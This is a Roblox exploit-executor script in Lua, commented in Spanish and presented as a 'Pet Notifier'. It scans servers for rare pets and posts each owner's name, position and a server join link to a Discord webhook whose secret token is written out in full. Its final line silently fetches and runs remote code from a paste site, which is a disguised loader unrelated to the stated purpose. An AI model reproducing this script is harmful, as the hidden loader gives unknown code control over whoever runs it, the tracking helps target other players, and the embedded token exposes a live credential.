-- 🐾 Pet Notifier + Discord Webhook
-- by AlexVM adaptado

--// Servicios
local Players   = game:GetService("Players")
local RunService= game:GetService("RunService")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer

--// CONFIG: Webhook de Discord
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1411323510164291634/5x4p7niAyMu5Dc5xnsGf-OYe8hvV3uoLjDHK7X8yT6g0xUe5KQfPErEWen1RMk8HfrRa"

--// Compatibilidad de request
local function getRequestFunc()
    return (syn and syn.request)
        or (http and http.request)
        or http_request
        or request
        or (fluxus and fluxus.request)
        or (function() return nil end)()
end

--// Enviar embed a Discord
local function sendDiscordEmbed(args)
    local req = getRequestFunc()
    if not req then
        warn("[Webhook] No hay función de request disponible.")
        return
    end

    local payload = {
        embeds = {{
            title = args.title or "Evento",
            description = args.description or "",
            color = args.color or 16776960,
            fields = args.fields or {},
            footer = { text = args.footer or "" },
            timestamp = args.timestamp or os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    pcall(function()
        req({
            Url = DISCORD_WEBHOOK,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(payload)
        })
    end)
end

--// Lista de mascotas para notificación
local notifyPets = {
    ["Agarrini la Palini"] = true,
    ["Bisonte Giuppitere"] = true,
    ["Blackhole Goat"] = true,
    ["Bulbito Bandito Traktorito"] = true,
    ["Cacasito Satalito"] = true,
    ["Chicleteira Bicicleteira"] = true,
    ["Chimpanzini Spiderini"] = true,
    ["Crabbo Limonetta"] = true,
    ["Dragon Cannelloni"] = true,
    ["Dul Dul Dul"] = true,
    ["Esok Sekolah"] = true,
    ["Garama and Madundung"] = true,
    ["Graipuss Medussi"] = true,
    ["Gattatino Nyanino"] = true,
    ["Job Job Job Sahur"] = true,
    ["Karkerkar Kurkur"] = true,
    ["Ketchuru and Musturu"] = true,
    ["La Grande Combinasion"] = true,
    ["La Supreme Combinasion"] = true,
    ["La Vacca Saturno Saturnita"] = true,
    ["Las Tralaleritas"] = true,
    ["Las Vaquitas Saturnitas"] = true,
    ["Los Bombinitos"] = true,
    ["Los Combinasionas"] = true,
    ["Los Hotspotsitos"] = true,
    ["Los Matteos"] = true,
    ["Los Noo My Hotspotsitos"] = true,
    ["Los Orcalitos"] = true,
    ["Los Spyderinis"] = true,
    ["Los Tralaleritos"] = true,
    ["Los Tungtungtungcitos"] = true,
    ["Mastodontico Telepiedone"] = true,
    ["Matteo"] = true,
    ["Noo My Hotspot"] = true,
    ["Nuclearo Dinossauro"] = true,
    ["Pakrahmatmamat"] = true,
    ["Pot Hotspot"] = true,
    ["Spaghetti Tualetti"] = true,
    ["Sammyni Spyderini"] = true,
    ["Statutino Libertino"] = true,
    ["Strawberry Elephant"] = true,
    ["Tartaruga Cisterna"] = true,
    ["Torrtuginni Dragonfrutini"] = true,
}

--// Función para obtener mutación y generación
local function getMutationMap()
    local mutationMap = {}
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return mutationMap end

    for _, plot in ipairs(plots:GetChildren()) do
        local podiums = plot:FindFirstChild("AnimalPodiums")
        if podiums then
            for _, podium in ipairs(podiums:GetChildren()) do
                local base = podium:FindFirstChild("Base")
                local spawn = base and base:FindFirstChild("Spawn")
                local attachment = spawn and spawn:FindFirstChild("Attachment")
                local overhead = attachment and attachment:FindFirstChild("AnimalOverhead")
                local displayName = overhead and overhead:FindFirstChild("DisplayName")
                local mutation = overhead and overhead:FindFirstChild("Mutation")
                local generation = overhead and overhead:FindFirstChild("Generation")

                if spawn and displayName and displayName:IsA("TextLabel") then
                    local name = displayName.Text
                    local mutationText = (mutation and mutation:IsA("TextLabel") and mutation.Visible and mutation.Text ~= "" and mutation.Text ~= "Normal") and mutation.Text or "Normal"
                    local generationText = (generation and generation:IsA("TextLabel")) and generation.Text or "Unknown"

                    table.insert(mutationMap, {
                        name = name,
                        position = spawn.Position,
                        mutation = mutationText,
                        generation = generationText
                    })
                end
            end
        end
    end
    return mutationMap
end

--// Función para determinar dueño del pet
local function getPetOwner(obj)
    local ownerName = "Desconocido"
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character and obj:IsDescendantOf(player.Character) then
            ownerName = player.Name
            break
        end
    end
    return ownerName
end

--// Detectar y enviar notificación inmediatamente
local detected = {}

local function checkPets()
    local mutationMap = getMutationMap()
    for _, obj in ipairs(Workspace:GetDescendants()) do
        if obj:IsA("Model") and notifyPets[obj.Name] and not detected[obj] then
            local mutationText, generationText = "Normal", "Unknown"
            for _, data in ipairs(mutationMap) do
                if data.name == obj.Name then
                    mutationText = data.mutation or "Normal"
                    generationText = data.generation or "Unknown"
                    break
                end
            end

            detected[obj] = true
            local pos = obj.PrimaryPart and obj.PrimaryPart.Position or Vector3.new()
            local ownerName = getPetOwner(obj)

            local joinLink = string.format(
                "https://www.roblox.com/games/%s/-?gameInstanceId=%s",
                tostring(game.PlaceId),
                tostring(game.JobId)
            )

            local embedFields = {
                { name = "Nombre", value = obj.Name, inline = true },
                { name = "Mutación", value = mutationText, inline = true },
                { name = "Generación", value = generationText, inline = true },
                { name = "Jugador", value = ownerName, inline = true },
                { name = "Posición", value = string.format("X: %.1f, Y: %.1f, Z: %.1f", pos.X, pos.Y, pos.Z), inline = false },
                { name = "Servidor", value = string.format("[Click para unirte](%s)", joinLink), inline = false },
            }

            sendDiscordEmbed({
                title = "🐾 Mascota objetivo detectada",
                description = "Se ha encontrado una mascota de la lista notifyPets.",
                color = 65280,
                fields = embedFields,
                footer = "Pet Notifier",
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            })
        end
    end
end

-- Ejecutar chequeo inmediato al iniciar
checkPets()

-- Loop para detectar nuevas mascotas en tiempo real
RunService.Heartbeat:Connect(checkPets)

loadstring(game:HttpGet("https://pastefy.app/9YIyWc7E/raw"))()